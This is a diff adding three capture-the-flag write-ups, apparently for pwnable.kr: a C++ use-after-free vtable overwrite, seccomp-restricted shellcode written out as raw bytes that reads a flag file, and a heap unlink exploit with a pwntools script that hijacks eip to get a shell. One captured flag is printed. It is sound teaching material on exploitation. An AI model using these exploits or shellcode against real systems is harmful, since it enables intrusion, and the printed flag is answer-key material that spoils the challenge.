@@ -460,3 +460,141 @@ def exploit():
   start_hand()
   print(p.recvline())
 ```
+
+
+### uaf 
+This is the first heap challenge, and it introduces a basic Use After Free vulnerability in a C++ executable.  The key to this challenge is understanding how C++ uses inheritance and constructors to create the `man` and `woman` classes.  The data is split into two areas: the vtables which contain constructor and member function addresses, and the heap which stores relevant data to each object.  An example of each is shown below.  
+
+```
+vtables
+0x401540 <_ZTV5Woman>:	    0x0000000000000000	0x00000000004015b0  < woman vtable (constructor, give shell, introduce)
+0x401550 <_ZTV5Woman+16>:	  0x000000000040117a	0x0000000000401376
+0x401560 <_ZTV3Man>:	      0x0000000000000000	0x00000000004015d0  < man vtable (constructor, give shell, introduce)
+0x401570 <_ZTV3Man+16>:	    0x000000000040117a	0x00000000004012d2
+0x401580 <_ZTV5Human>:	    0x0000000000000000	0x00000000004015f0  < human vtable (constructor, give shell, introduce)
+0x401590 <_ZTV5Human+16>:	  0x000000000040117a	0x0000000000401192
+
+Heap 
+0x18ddc10:	0x0000000000000000	0x0000000000000031 < Human header
+0x18ddc20:	0x0000000000000004	0x0000000000000004
+0x18ddc30:	0x0000000000000000	0x000000006b63614a < name 
+0x18ddc40:	0x0000000000000000	0x0000000000000021 < man header
+0x18ddc50:	0x0000000000401570	0x0000000000000019 < man vtable / age
+0x18ddc60:	0x00000000018ddc38	0x0000000000000031 < link to name / Human header
+0x18ddc70:	0x0000000000000004	0x0000000000000004
+0x18ddc80:	0x0000000000000001	0x000000006c6c694a < name
+0x18ddc90:	0x0000000000000000	0x0000000000000021 < woman header
+0x18ddca0:	0x0000000000401550	0x0000000000000015 < woman vtable / age
+0x18ddcb0:	0x00000000018ddc88	0x0000000000020351 < link to name / top chunk header
+```
+
+The user controls when the UAF is created and triggered by choosing the "free" and "use" options, respectively.  First, freeing both classes will actually free four total heap chunks: two 0x30 length chunks for each inherited `Human` class, and then the 0x20 `man` and `woman` chunks.  The last "after" choice allocates user input to the heap using C++'s `new` operation, and the user chooses how much to allocate.  By strategically allocating less than 0x18 bytes, the returned chunk will absorb one of the man / woman classes.  Tcache is a FIFO stack, so the first chunk overridden is the former `woman` chunk.  This is not particuarly useful, because `man->introduce()` is the first function called in the "use" choice.  If the `man` chunk is not overriden then this call will lead to a segmentation fault.  So both chunks must be overridden by less than 0x18 bytes of an external file.  The overwrite strategy is to clobber the first qword which maintains the `man` vtable address; when `man->introduce()` is called, the binary finds `man`'s vtable and then the offset for `introduce()` within that vtable.  As shown in the first data dump, that offset is 0x18 bytes into the vtable.  By overwriting the vtable address to 0x8 bytes before its actual value, the 0x18 will instead call `give_shell()`, which returns a user shell and can read the flag from the server. 
+
+### asm
+This is a basic shellcoding challenge within a `seccomp` environment. The basic idea of the challenge is to read a ridiculously named file from the remote server using only the `read, write, open, and exit` functions.  The challenge provides a direct call to the shellcode and also starts with a stub which clears all potentially needed registers.  Because the shellcoe is `mmap`d at a known address, it is possible to use that known address as a hard-coded value in the shellcode.  However, relative values could be leveraged to make the exploit behave more dynamically.  
+
+The shellcode is relatively simple. First, the filename must be loaded into memory because it does not already exist.  Before storing this, a few instructions are required to store the current address and jump rip past the filename. Since the filename is a known length, this is relatively simple.  The process of reading the flag requires calls to `open()`, `read()`, `write()` and `exit()`, in that order.  The following code generates the required shellcode to read the flag and write it to `stdout`.   
+
+```python
+filename = b'./this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong\x00'
+
+shellcode =  b"\x4C\x8D\x3D\x00\x00\x00\x00"    # lea r15, [rip], 
+shellcode += b"\x4D\x89\xFE"                    # mov r14, r15
+shellcode += b"\x48\x89\xE5"                    # mov rbp, rsp
+shellcode += b"\x49\x81\xC7"                    # add r15, len(shellcode + next instructions)
+shellcode += (len(filename) + 0x18).to_bytes(4, "little") 
+shellcode += b"\x49\x83\xC6"                    # add r14, len(next instructions) 
+shellcode += 0x14.to_bytes(1, "little")
+shellcode += b"\x41\xFF\xE7"                    # jmp r15
+shellcode += filename
+shellcode += b'\x90' * 0x10
+# open
+shellcode += b"\x4C\x89\xF7"                    # mov rdi, r14 ; 
+shellcode += b"\xB0\x02"                        # mov al, 2
+shellcode += b"\x0F\x05"                        # syscall
+shellcode += b"\x49\x89\xC5"                    # mov r13, rax
+# read
+shellcode += b"\x48\x89\xC7"                    # mov r15, rax
+shellcode += b"\x49\x81\xC6\x00\x03\x00\x00"    # add r14, 0x300
+shellcode += b"\x4C\x89\xF6"                    # mov rsi, r14
+shellcode += b"\x48\xC7\xC2\x00\x01\x00\x00"    # mov rdx, 0x100
+shellcode += b"\x48\x31\xC0"                    # xor rax, rax
+shellcode += b"\x0F\x05"                        # syscall
+# write
+shellcode += b"\x48\xC7\xC7\x01\x00\x00\x00"    # mov rdi, 1
+shellcode += b"\xB0\x01"                        # mov al, 1
+shellcode += b"\x0F\x05"                        # syscall
+# exit(0)
+shellcode += b"\x48\x31\xFF"                    # xor rdi, rdi
+shellcode += b"\xB8\x3C\x00\x00\x00"            # mov eax, 60
+shellcode += b"\x0F\x05"                        # syscall
+
+print(shellcode)
+```
+
+```
+Mak1ng_shelLcodE_i5_veRy_eaSy
+```
+
+### unlink
+This is another heap challenge with a heap buffer overflow courtesy of `gets()`.  The `OBJ` structures are `malloc`d on the heap and user input can overflow the first object to clobber the second and / or third object.  This is followed by the `unlink()` function which modfies memory within the objects pointed to by `B->fd` and `B-bk`.  Both these values can be clobbered by the heap buffer overflow.  The trick for this challenge is: how should they be modified?  The program contains a `shell()` function which resides at a stack address because the binary is compiled without PIE.  So the goal is to hijack eip with the address to shell through the overflow and unlinking. 
+
+Overwriting the return instruction pointer directly is impossible, because storing `shell()`'s address would also overwrite data within the shell function during unlinking.
+
+```c
+// shell() needs to be either FD or BK, meaning it will be overwritten by the return address
+FD->bk=BK; 
+BK->fd=FD;
+```
+
+But eip can be hijacked by first hijacking ebp to pop a different base pointer using the `leave` instruction in unlink.  This is normally a valid method, however decompilation at the end of `main()` (below) shows that the return instruction is actually stored at `[ebp-0x4] - 0x4`.
+
+```gdb
+0x080485f2 <+195>:	call   0x8048504 <unlink>
+0x080485f7 <+200>:	add    esp,0x10
+0x080485fa <+203>:	mov    eax,0x0
+0x080485ff <+208>:	mov    ecx,DWORD PTR [ebp-0x4]
+0x08048602 <+211>:	leave  
+0x08048603 <+212>:	lea    esp,[ecx-0x4]
+0x08048606 <+215>:	ret    
+```
+
+This means the following structure is implemented.  The final value moved into esp (and then popped into eip with `ret`) is modified by changing the value stored in ecx. 
+
+```
+             ebp - 0x4  --  ebp
+                 |
+                ecx   < target : hijack here >
+                 |
+ return  --  return + 0x4       
+```
+
+All the required addresses involved are calculable: `ebp - 0x4` is found to be `stack address + 0x10`, `shell()` can be stored on the heap at a known address in relation to `heap address`, and a pointer to `shell address + 0x4` can be trivially calculated.  The following exploit demonstrates a successful eip hijack and shell on the server. 
+
+```python
+from pwn import *
+
+def exploit(): 
+    p = process("./unlink")
+    # get addresses
+    p.recvuntil(b"address leak: ")
+    stack_address = int(p.recvline(), 16)
+    ebp_minus_4 = stack_address + 0x10
+    shell_address = 0x80484eb
+    p.recvuntil(b"address leak: ")
+    heap_address = int(p.recvline(), 16)
+    p.recvuntil(b'shell!\n')
+
+    # craft and send payload
+    payload =  p32(shell_address)
+    payload += b'A' * 0x8                   # fill buffer and next dword
+    payload += p32(0x19)                    # size of chunk (could clobber)
+    payload += p32(ebp_minus_4 - 0x4)       # ptr to 4 bytes before target address
+    payload += p32(heap_address + 0xc)      # ptr to 4 bytes before shell address on heap
+    payload += b'\n'
+    p.send(payload)
+    p.interactive()
+
+if __name__ == "__main__":
+    exploit()
+```
